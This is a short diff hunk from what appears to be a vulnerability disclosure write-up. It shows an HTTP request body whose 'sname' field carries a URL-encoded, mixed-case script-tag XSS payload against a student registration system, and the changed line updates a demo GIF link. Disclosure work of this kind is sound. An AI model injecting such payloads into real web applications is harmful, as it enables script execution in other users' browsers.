@@ -29,4 +29,4 @@ Upgrade-Insecure-Requests: 1
 sname=%3CScRiPt%3Ealert%281%29%3C%2FsCrIpT%3E&contact=7566969650&grade=11&joindate=2020-02-14&about=Demo+About+Text&emailid=christinemoore%40gmail.com&id=5&action=update&save=
 ```
 
-![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/xss.gif?raw=true)
+![](https://github.com/mikeccltt/0525/blob/main/student-registration-and-fee-payment-system/xss.gif?raw=true)
